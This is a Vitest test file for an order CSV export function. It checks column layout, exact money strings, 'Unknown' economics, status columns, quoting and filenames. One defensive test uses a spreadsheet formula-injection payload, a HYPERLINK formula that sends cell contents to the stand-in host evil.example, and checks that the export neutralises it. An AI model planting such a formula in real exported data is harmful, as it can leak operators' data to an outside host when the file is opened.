import { describe, expect, it } from 'vitest';
import { buildOrderCsv, orderCsvFilename, ORDER_CSV_COLUMNS } from './orderCsv';
import type { ChannelOrderRow } from './orderApi';

function order(overrides: Partial<ChannelOrderRow> = {}): ChannelOrderRow {
  return {
    id: '11111111-1111-1111-1111-111111111111',
    channelInstanceId: '22222222-2222-2222-2222-222222222222',
    channelName: 'Ryzen Builder',
    externalOrderId: '3985600001',
    orderNumber: '3985600001',
    triolooInvoiceNumber: 'TR0001',
    ownership: 'API_MANAGED',
    statuses: ['pending'],
    canonicalStatuses: ['PENDING_VERIFICATION'],
    dispatchObservedAt: null,
    providerCreatedAt: '2026-08-21T10:26:00Z',
    providerUpdatedAt: '2026-08-21T11:02:00Z',
    lastSeenAt: '2026-08-23T10:00:00Z',
    price: '429200.00',
    paymentMethod: 'Cash on Delivery',
    itemsCount: 2,
    customerFirstName: 'Tanvir',
    customerLastName: 'Enterprise',
    shippingPhone: '+8801712448903',
    shippingLine: 'House 42, Banani, Dhaka, 1213',
    buyerNote: 'Handle with care',
    itemName: 'Dell OptiPlex 7010 SFF',
    trackingCode: 'DEX-BDN-0072025926',
    invoiceNumber: 'INV-2026-0041',
    purchaseOrderId: '659537729498894',
    ...overrides,
  } as ChannelOrderRow;
}

function cells(line: string): string[] {
  // Minimal RFC 4180 reader, enough to assert on what we wrote.
  const out: string[] = [];
  let current = '';
  let quoted = false;
  for (let i = 0; i < line.length; i++) {
    const c = line[i];
    if (quoted) {
      if (c === '"' && line[i + 1] === '"') {
        current += '"';
        i++;
      } else if (c === '"') {
        quoted = false;
      } else {
        current += c;
      }
    } else if (c === '"') {
      quoted = true;
    } else if (c === ',') {
      out.push(current);
      current = '';
    } else {
      current += c;
    }
  }
  out.push(current);
  return out;
}

describe('Orders CSV export', () => {
  it('writes the header and one row per order', () => {
    const csv = buildOrderCsv([order(), order({ id: 'b', triolooInvoiceNumber: 'TR0002' })]);
    const lines = csv.split('\r\n');

    expect(lines).toHaveLength(3);
    expect(cells(lines[0]!)).toEqual([...ORDER_CSV_COLUMNS]);
    expect(cells(lines[1]!)[0]).toBe('TR0001');
    expect(cells(lines[2]!)[0]).toBe('TR0002');
  });

  it('writes money as the exact authoritative string, never a number', () => {
    const csv = buildOrderCsv([order({ price: '429200.00' })]);
    const row = cells(csv.split('\r\n')[1]!);

    // 🔴 `TEC-015` / `OSC-043` — the decimal string crosses untouched. A `Number` round-trip
    // would render `429200`, and a display formatter would render `৳ 429,200`; neither is the
    // authoritative value and neither parses back as the same amount.
    expect(row[ORDER_CSV_COLUMNS.indexOf('Sale')]).toBe('429200.00');
  });

  it('writes unknown economics as the word, never as an empty cell', () => {
    const row = cells(buildOrderCsv([order()]).split('\r\n')[1]!);

    // 🔴 `INV-32.4` / `BR-007` / `SYS-034`. An empty cell SUMS AS ZERO: a reader totalling the
    // Margin column of a blank export gets a confident, wrong number. The word cannot be summed.
    for (const column of ['Cost', 'Charges', 'Received', 'Margin']) {
      expect(row[ORDER_CSV_COLUMNS.indexOf(column as never)]).toBe('Unknown');
    }
  });

  it('keeps the two statuses in two columns', () => {
    const row = cells(buildOrderCsv([order()]).split('\r\n')[1]!);

    // 🔴 `BR-171` / `UX-182` / `UX-044.e` — independently-owned states are never merged into one
    // column. A spreadsheet is where that merge does the most damage: no chip, no tooltip, no page.
    expect(row[ORDER_CSV_COLUMNS.indexOf('ERP status')]).toBe('Pending verification');
    expect(row[ORDER_CSV_COLUMNS.indexOf('Marketplace status')]).toBe('pending');
  });

  it('states the SM-5 payment position rather than inventing a paid flag', () => {
    const notDue = cells(buildOrderCsv([order()]).split('\r\n')[1]!);
    const due = cells(buildOrderCsv([order({ canonicalStatuses: ['DELIVERED'] })]).split('\r\n')[1]!);

    expect(notDue[ORDER_CSV_COLUMNS.indexOf('Payment position')]).toBe('Payment not due');
    expect(due[ORDER_CSV_COLUMNS.indexOf('Payment position')]).toBe('Payment due');
  });

  it('neutralises a buyer-supplied formula so a spreadsheet cannot execute it', () => {
    // 🔴 SECURITY. The buyer note, the customer name and the address are all typed by a stranger
    // on a marketplace. Excel, Sheets and LibreOffice all execute a cell beginning `=`, `+`, `-`
    // or `@` on open — so this is code arriving on an operator's machine, not a formatting quirk.
    const csv = buildOrderCsv([order({
      buyerNote: '=HYPERLINK("http://evil.example/"&A1,"click")',
      customerFirstName: '+49',
      customerLastName: '',
    })]);
    const row = cells(csv.split('\r\n')[1]!);

    expect(row[ORDER_CSV_COLUMNS.indexOf('Buyer note')]).toBe(
      '\'=HYPERLINK("http://evil.example/"&A1,"click")',
    );
    expect(row[ORDER_CSV_COLUMNS.indexOf('Customer')]).toBe("'+49");

    // ⚠ And the value is otherwise INTACT — the operator still reads what the buyer wrote.
    expect(row[ORDER_CSV_COLUMNS.indexOf('Buyer note')]).toContain('evil.example');
  });

  it('escapes quotes, commas and newlines without losing content', () => {
    const csv = buildOrderCsv([order({ buyerNote: 'Ring "twice", then\nleave at gate' })]);
    const lines = csv.split('\r\n');

    // The embedded newline must not split the record into two CSV rows.
    expect(lines[0]).toBeDefined();
    expect(csv).toContain('"Ring ""twice"", then\nleave at gate"');
  });

  it('names the file after the scope so two exports cannot be confused', () => {
    const on = new Date(2026, 7, 24);
    expect(orderCsvFilename('selected', 3, on)).toBe('orders-selected-3-2026-08-24.csv');
    expect(orderCsvFilename('all', 158, on)).toBe('orders-all-158-2026-08-24.csv');
  });
});
